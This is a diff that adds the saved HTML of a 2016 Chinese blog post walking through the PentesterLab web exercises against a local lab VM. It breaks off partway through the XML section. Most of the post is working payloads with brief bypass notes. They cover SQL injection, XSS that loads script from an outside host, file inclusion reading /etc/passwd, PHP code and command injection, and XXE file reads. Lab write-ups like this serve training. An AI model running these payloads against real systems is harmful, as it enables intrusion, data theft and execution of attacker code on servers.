@@ -1,0 +1,769 @@
+<!doctype html>
+<html class="theme-next use-motion ">
+<head>
+    
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+
+  <link href='//fonts.useso.com/css?family=Lato:300,400,700,400italic&subset=latin,latin-ext' rel='stylesheet' type='text/css'>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.4"/>
+
+
+    <meta name="description" content="水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会" />
+
+
+
+  <meta name="keywords" content="Pentest," />
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hc1m1" type="application/atom+xml" />
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/img/favicon.png?v=0.4.4" />
+
+
+<meta name="description">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Pentester Lab Writeup">
+<meta property="og:url" content="http://lazysheep.cc/2016/03/21/0x15/index.html">
+<meta property="og:site_name" content="Hc1m1">
+<meta property="og:description">
+<meta property="og:image" content="http://lazysheep.cc/img/pent.png">
+<meta property="og:updated_time" content="2016-03-22T13:41:48.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Pentester Lab Writeup">
+<meta name="twitter:description">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: '',
+    sidebar: 'post'
+  };
+</script>
+
+    <title> Pentester Lab Writeup // Hc1m1 </title>
+</head>
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+<!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?4b6b8b9a09d24f4d4e26c50bd1707fd7";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+<div class="container one-column page-post-detail">
+    <div class="headband"></div>
+    <header style="background: #f5f5f5;" id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+        <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Hc1m1</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-home"></i> <br />
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            <i class="menu-item-icon icon-categories"></i> <br />
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            <i class="menu-item-icon icon-about"></i> <br />
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            Tags
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+        </div>
+    </header>
+
+    <main id="main" class="main">
+        <div class="main-inner">
+            <div id="content" class="content">
+                
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              Pentester Lab Writeup
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          Posted on
+          <time itemprop="dateCreated" datetime="2016-03-21T10:16:46+08:00" content="2016-03-21">
+            2016-03-21
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; In
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a href="/categories/H-blog/" itemprop="url" rel="index"><span itemprop="name">H-blog</span></a></span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2016/03/21/0x15/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2016/03/21/0x15/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="/img/pent.png" alt="pentest"><br><a id="more"></a><br>玩了下exploit, 再来玩玩pentest。</p>
+<h1 id="SQLI">SQLI</h1><h2 id="Example_1">Example 1</h2><p>没做任何过滤，简单。。不过看了下，mysql的用户没啥权限，所以最多就是查看数据库信息了，没法读系统文件，写文件getshell。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example1.php?name=admin<span class="number">%27</span><span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>version(),load_file(<span class="number">%22</span>/etc/passwd<span class="number">%22</span>),user(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_2">Example 2</h2><p>这题就过滤了空格呗。。也简单。。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/sqli/example2.php?name=root%27<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="operator"><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">version</span>(),<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>SCHEMA_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.SCHEMATA%<span class="number">23</span></span><br><span class="line">http://<span class="number">192.168</span>.56.102/sqli/example2.php?name=root%<span class="number">27</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>TABLE_NAME,<span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">TABLES</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=%<span class="number">22</span>exercises%<span class="number">22</span>%<span class="number">23</span></span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_3">Example 3</h2><p>只能说上题的payload还能用。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example3.php?name=root%<span class="number">27</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="function">user</span>(),<span class="function">database</span>(),<span class="function">version</span>(),<span class="number">4</span>,<span class="number">5%</span><span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
+<p>去看看源码。。看看这两题的过滤有啥区别。。<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//example2.php</span></span><br><span class="line"><span class="keyword">if</span> <span class="params">(preg_match<span class="params">('/ /', $_GET[<span class="string">"name"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR NO SPACE"</span>)</span>;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//example3.php</span></span><br><span class="line"><span class="keyword">if</span> <span class="params">(preg_match<span class="params">('/\s+/', $_GET[<span class="string">"name"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR NO SPACE"</span>)</span>;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这过滤对我的payload并没有影响。。</p>
+<h2 id="Example_4">Example 4</h2><p>换整型注入了。。一样。。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example4.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_5">Example 5</h2><p>上题的payload还是可以用，这题的过滤是要求0-9开头<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example5.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),5,6<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_6">Example 6</h2><p>猜到了，这题是要求0-9结尾。。一样简单<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example6.php?id=2<span class="number">%20</span>union<span class="number">%20</span>select<span class="number">%20</span>user(),version(),database(),4,5<span class="number">%233</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_7">Example 7</h2><p>这题看了源码。<br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/sqli/example7.php?id=2<span class="number">%0</span>aunion<span class="number">%20</span>select<span class="number">%20</span>version(),user(),database(),4,5<span class="number">%23</span></span><br></pre></td></tr></table></figure></p>
+<p>这题需要用%0a来bypass，因为。。看源码：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="params">(!preg_match<span class="params">('/^-?[<span class="number">0</span>-<span class="number">9</span>]+$/m', $_GET[<span class="string">"id"</span>])</span>)</span> &#123;</span><br><span class="line">		die<span class="params">(<span class="string">"ERROR INTEGER REQUIRED"</span>)</span>;	</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>主要是最后的/m<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m <span class="comment">(PCRE_MULTILINE)</span></span><br><span class="line">默认情况下，PCRE 认为目标字符串是由单行字符组成的<span class="comment">(然而实际上它可能会包含多行)</span>， <span class="string">"行首"</span>元字符 <span class="comment">(^)</span> 仅匹配字符串的开始位置， 而<span class="string">"行末"</span>元字符 <span class="comment">($)</span> 仅匹配字符串末尾， 或者最后的换行符<span class="comment">(除非设置了 D 修饰符)</span>。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 /m 修饰符。如果目标字符串 中没有 <span class="string">"\n"</span> 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</span><br></pre></td></tr></table></figure></p>
+<p>意思就是，加了一个\n后，就会有两行，只要其中一行满足正则匹配就会返回true</p>
+<h2 id="Example_8">Example 8</h2><p>很明显，是在<code>order by</code>的位置注，不过就不能使用union了，所以用布尔盲注。。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id`,(select%<span class="number">20</span><span class="function">ascii</span>(<span class="function">substr</span>(<span class="function">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
+<p>写个脚本跑这个payload就好了，有两个变量var1和var2，var1是int型表示字符串的几var1位，var2就是跑ascii码，如果页面有显示内容，则表示user()第var1字符的ascii码为var2。</p>
+<p>以前写过这样的脚本，现在就懒得写了。。</p>
+<h2 id="Example_9">Example 9</h2><p>和前面一个比，就是少了一个`， 其他都一样<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.102</span>/sqli/example8.php?order=id, (select%<span class="number">20</span><span class="function">ascii</span>(<span class="function">substr</span>(<span class="function">user</span>(), [var1],<span class="number">1</span>))=[var2])%<span class="number">23</span></span></span></span><br></pre></td></tr></table></figure></p>
+<h1 id="XSS">XSS</h1><h2 id="Example_1-1">Example 1</h2><p>很简单，没做过过滤的xss<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example1.php?name=hacker%<span class="number">3</span>Cscript%<span class="number">20</span>src=%<span class="number">22</span>http://xxx.xxx.xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/script%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
+<p>成功弹窗</p>
+<h2 id="Example_2-1">Example 2</h2><p>变个大小写就好了<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example2.php?name=hacker%<span class="number">3</span>Cscript%<span class="number">20</span>src=%<span class="number">22</span>http://xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/scriPT%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_3-1">Example 3</h2><p>价格空格就好了<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example3.php?name=hacker%<span class="number">3</span>CscripT%<span class="number">20</span>src=%<span class="number">22</span>http://xxx/<span class="keyword">template</span>/alert.js%<span class="number">22</span>%<span class="number">3</span>E%<span class="number">3</span>C/<span class="type">Script</span>%<span class="number">20</span>%<span class="number">3</span>E</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_4-1">Example 4</h2><p>过滤了script，而且不是去掉而是出现了就直接报错，不过任然可以日。<br>payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/xss/example4.php?name=hacker<span class="number">%3</span>Csvg/onload=<span class="number">%22</span>var<span class="number">%20</span>i=String.fromCharCode(115,<span class="number">%2099</span>,<span class="number">%20114</span>,<span class="number">%20105</span>,<span class="number">%20112</span>,<span class="number">%20116</span>);s<span class="number">%20</span>=<span class="number">%20</span>createElement(i);body.appendChild(s);s.src=<span class="number">%27</span>http://xxx/template/alert.js<span class="number">%27</span>;<span class="number">%22</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_5-1">Example 5</h2><p>过滤的是alert，可惜我都不是直接用alert, 改个文件名就好了<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.102/xss/example5.php?name=hacker<span class="number">%3</span>Cscript<span class="number">%20</span>src=<span class="number">%22</span>http://xxx/myjs/test.js<span class="number">%22</span><span class="number">%3</span>E<span class="number">%3</span>C/script<span class="number">%3</span>E</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_6-1">Example 6</h2><p>这回代码是插在<code>&lt;script&gt;</code>里面, 没做啥过滤<br>payload:<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example6.php?name=<span class="string">script";s=document.createElement($a);s.src="</span>http://xxx/<span class="keyword">template</span>/alert.<span class="string">js";document.getElementsByTagName( "</span><span class="string">head" )[0].appendChild(s);//</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Exmple_7">Exmple 7</h2><p>…过滤了双引号。。不过和上题有差？<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">56</span>.<span class="number">102</span>/xss/example7.php?name=script';s=document.createElement($a);s.src='http://xxx/<span class="keyword">template</span>/alert.js';document.getElementsByTagName( 'head')[<span class="number">0</span>].appendChild(s);//</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_8-1">Example 8</h2><p>这题改成POST了，然后直接输出，把尖括号编码了。。能艹？上次SSCTF也有类似的题，可是是通过框架来日。。所以看了下源码。。<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=<span class="string">"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;"</span> <span class="keyword">method</span>=<span class="string">"POST"</span>&gt;</span><br></pre></td></tr></table></figure></p>
+<p>好了，有了这句就能艹了。。原来不是用POST</p>
+<p>payload:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/xss/example8.php/"&gt;<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xxx</span>/<span class="attribute">template</span>/<span class="attribute">alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_9-1">Example 9</h2><p>这题貌似看浏览器啊。。用firefox会自动帮你urlencode，用chrome成功了。。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.102/xss/example9.php#<span class="tag">&lt;<span class="title">script</span> <span class="attribute">src</span>=<span class="value">http:</span>//<span class="attribute">xss.lazysheep.cc</span>/<span class="attribute">template</span>/<span class="attribute">alert.js</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="File_Include">File Include</h1><h2 id="Example_1-2">Example 1</h2><p>很简单。。没做任何过滤<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:<span class="regexp">//</span><span class="number">192.168</span>.56.102<span class="regexp">/fileincl/example1.php?page=/</span>..<span class="regexp">/../</span>../../etc/passwd</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_2-2">Example 2</h2><p>也简单，就是会在名字后面自动加上<code>.php</code>，用%00可以bypass<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.102/fileincl</span><span class="regexp">/example2.php?page=/etc</span><span class="regexp">/passwd%00</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="Code_injection">Code injection</h1><h2 id="Example_1-3">Example 1</h2><p>入门的代码执行漏洞。。没做任何过滤。。<br>payload:<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.102</span>/codeexec/example1.php?name=<span class="variable">%22</span>;<span class="keyword">system</span>(<span class="variable">%27cat</span><span class="variable">%20</span>/etc/passwd<span class="variable">%27</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_2-3">Example 2</h2><p>这题也不难，搜索一下<code>php create_function 代码注入</code>，我来分析下。。源码如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">usort(<span class="variable">$users</span>, create_<span class="keyword">function</span>(<span class="string">'$a, $b'</span>, <span class="string">'return strcmp($a-&gt;'</span>.<span class="variable">$order</span>.<span class="string">',$b-&gt;'</span>.<span class="variable">$order</span>.<span class="string">');'</span>));</span><br></pre></td></tr></table></figure></p>
+<p>然后系统会拼凑一个函数：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">(<span class="variable">$a</span>, <span class="variable">$b</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strcmp(<span class="variable">$a</span>-&gt;<span class="variable">$order</span>, <span class="variable">$b</span>-&gt; <span class="variable">$order</span>); &#125;</span><br></pre></td></tr></table></figure></p>
+<p>然后会使用eval函数，看到这里就好了。。<br>Payload：<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="value">://<span class="number">192.168</span>.<span class="number">56.102</span>/codeexec/example2.php?order=id,<span class="variable">$b</span>-%<span class="number">3</span>Ename);</span>&#125;<span class="function">phpinfo</span>();<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
+<p>这样拼凑的函数就成了<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">(<span class="variable">$a</span>,<span class="variable">$b</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strcmp(<span class="variable">$a</span>-&gt;id, <span class="variable">$b</span>-&gt;name);&#125;phpinfo();<span class="comment">//);&#125;</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_3-2">Example 3</h2><p>这题随便试下报错发现用了preg_replace，然后又是代码注入的题，自然想到了<code>\e</code>修饰符<br>Payload:<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168</span>.<span class="number">56.101</span>/codeexec/example3.php?<span class="variable">new=</span>phpinfo()&amp;<span class="variable">pattern=</span>/lamer/e&amp;<span class="variable">base=</span>lamer</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_4-2">Example 4</h2><p><code>assert</code>的命令执行，跟<code>eval</code>用法类似，不过黑盒了半天都有问题。白盒了后<br>Payload:<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http<span class="value">://<span class="number">192.168</span>.<span class="number">56.101</span>/codeexec/example4.php?name=%<span class="number">27</span>.<span class="function">phpinfo</span>();</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="Commands_injecttion">Commands injecttion</h1><h2 id="Example_1-4">Example 1</h2><p>没做任何过滤的。。。直接就可以输入命令了。。<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="rule"><span class="attribute">http</span>:<span class="value">//<span class="number">192.168</span>.<span class="number">56.101</span>/commandexec/example1.php?ip=</span></span>;<span class="tag">ls</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_2-4">Example 2</h2><p>这种遇到的少了，还是白盒了，然后发现<code>preg_match</code>的正则有\m修饰符，就会了。。。<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">192.168.56.101</span>/commandexec/example2.php?ip=<span class="number">127.0.0.1</span>%0als</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_3-3">Example 3</h2><p>这题还不错。。受到前几题的影响，一直在想正则怎么绕了，研究了半天，发现正则写的没问题，根本绕过不<br><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match('/^<span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="command">\.</span><span class="command">\d</span><span class="special">&#123;</span>1,3<span class="special">&#125;</span><span class="formula">$/', $</span>_GET<span class="special">[</span>'ip'<span class="special">]</span>)</span><br></pre></td></tr></table></figure></p>
+<p>看了LL的wp后在注意到，header后竟然没有exit，这就跟没过滤一样了，这类的题目以前遇到过。。<br>Payload:<br><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -v "http://<span class="number">192.168.56.101</span>/commandexec/example3.php?ip=<span class="number">127.0.0.1</span><span class="comment">;ls"</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="XML_attacks">XML attacks</h1><p>这部分是XXE注入，XML Entity Injection, XML不是特别了解，参考文档<a href="https://www.91ri.org/9539.html" target="_blank" rel="external">https://www.91ri.org/9539.html</a></p>
+<h2 id="Example_1-5">Example 1</h2><p>根据文档中的例子，自己试了试，把能删的都删了，剩下必须的部分：<br><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">56.101</span>/xml/example1.php?xml=<span class="variable">%3C</span><span class="variable">%21DOCTYPE</span><span class="variable">%20h</span><span class="variable">%20</span><span class="variable">%5B</span><span class="variable">%3C</span><span class="variable">%21ENTITY</span><span class="variable">%20pen</span><span class="variable">%20SYSTEM</span><span class="variable">%20</span><span class="variable">%22file</span><span class="variable">%3A</span><span class="variable">%2f</span><span class="variable">%2f</span><span class="variable">%2fetc</span><span class="variable">%2fpasswd</span><span class="variable">%22</span><span class="variable">%20</span><span class="variable">%3E</span><span class="variable">%5D</span><span class="variable">%3E</span><span class="variable">%3Ctext</span><span class="variable">%3E</span><span class="variable">%26pen</span><span class="variable">%3B</span><span class="variable">%3C</span><span class="variable">%2ftext</span><span class="variable">%3E</span></span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM <span class="string">"file:///etc/passwd"</span> &gt;]&gt;&lt;text&gt;&amp;pen;&lt;<span class="regexp">/text&gt;</span><br><span class="line">http:/</span><span class="regexp">/192.168.56.101/xml</span><span class="regexp">/example1.php?xml=%3C%21DOCTYPE%20h%20%5B%3C%21ENTITY%20pen%20SYSTEM%20%22php%3A%2f%2ffilter%2fread%3Dconvert.base64-encode%2fresource%3Dexample1.php%22%20%3E%5D%3E%3Ctext%3E%26pen%3B%3C%2ftext%3E</span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM "php:/</span><span class="regexp">/filter/read</span>=convert.base64-encode/resource=example1.php<span class="string">" &gt;]&gt;&lt;text&gt;&amp;pen;&lt;/text&gt;</span><br><span class="line">http://192.168.56.101/xml/example1.php?xml=<span class="variable">%3C</span><span class="variable">%21DOCTYPE</span><span class="variable">%20h</span><span class="variable">%20</span><span class="variable">%5B</span><span class="variable">%3C</span><span class="variable">%21ENTITY</span><span class="variable">%20pen</span><span class="variable">%20SYSTEM</span><span class="variable">%20</span><span class="variable">%22http</span>:/<span class="variable">%2f127</span>.0.0.1<span class="variable">%22</span><span class="variable">%20</span><span class="variable">%3E</span><span class="variable">%5D</span><span class="variable">%3E</span><span class="variable">%3Ctext</span><span class="variable">%3E</span><span class="variable">%26pen</span><span class="variable">%3B</span><span class="variable">%3C</span><span class="variable">%2ftext</span><span class="variable">%3E</span></span><br><span class="line">&lt;!DOCTYPE h [&lt;!ENTITY pen SYSTEM "</span>http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0</span>.<span class="number">1</span><span class="string">" 